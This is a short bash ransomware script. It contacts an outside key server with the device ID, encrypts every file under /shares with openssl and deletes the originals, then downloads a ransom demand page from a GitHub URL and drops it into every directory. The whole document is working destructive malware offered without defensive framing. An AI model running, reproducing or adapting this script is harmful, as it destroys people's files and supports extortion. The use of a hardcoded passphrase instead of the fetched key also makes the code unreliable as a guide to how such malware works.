#!/bin/bash

# Server where unique key is created
keyServer="https://secure.www-ssl.co"

# Payment demand splash screen
splashLocation="https://raw.githubusercontent.com/absane/Tricks/master/ransom/ransomware_splash.html"

# Folder to encrypt
targetFolder="/shares"

#	Encrypt files
. /tmp/dynamicconfig.ini
KEY=$(curl ${keyServer}/key.php?mac=$DEVICEID -s)
find -L $targetFolder -type f -exec openssl enc -pass pass:password -aes256 -in '{}' -out {}.enc \; -exec rm -f '{}' \;

#	Warn user their files are encrypted
curl $splashLocation -s > /tmp/READTHIS_YourFilesAreEncrypted.html
find -L $targetFolder -type d -exec cp /tmp/READTHIS_YourFilesAreEncrypted.html '{}' \;
